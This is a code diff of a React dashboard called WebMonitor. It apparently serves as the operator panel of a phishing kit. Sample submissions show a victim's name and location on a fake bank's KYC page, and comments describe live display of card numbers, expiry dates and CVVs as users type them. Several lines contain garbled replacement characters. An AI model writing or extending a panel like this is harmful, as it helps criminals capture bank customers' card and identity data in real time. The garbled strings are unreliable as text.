@@ -188,7 +188,7 @@ const submissionData: UserSubmission[] = [
     status: "pending_review",
     statusText: "待审核",
     submissionType: "identity_verification",
-    websiteName: "在线银���系统",
+    websiteName: "在线�����系统",
     currentPage: "/kyc/identity-check",
     userName: "王大强",
     userLocation: "广州市天河区",
@@ -372,7 +372,7 @@ export function WebMonitor() {
             </Button>
 
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              ⚠️ 风险预警
+              ⚙️ 面板设置
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               📝 日志查看
@@ -390,7 +390,7 @@ export function WebMonitor() {
                 ? 'flash-submit'
                 : ''
             }`}>
-              {/* 顶部：编号、前台页面、���在payment页面 */}
+              {/* 顶部：编号、前台页面、正在payment页面 */}
               <div className="flex items-center justify-between mb-1 pb-1 border-b border-gray-100">
                 <div className="flex items-center gap-3">
                   <div className="flex items-center gap-1">
@@ -485,7 +485,7 @@ export function WebMonitor() {
                 </div>
               </div>
 
-              {/* 中部：卡的类型、手机号、姓名、卡号、有效期���CVV */}
+              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
               {(() => {
                 // 检查是否有用户实际输入数据
                 const hasUserData = submission.realtimeInput && (
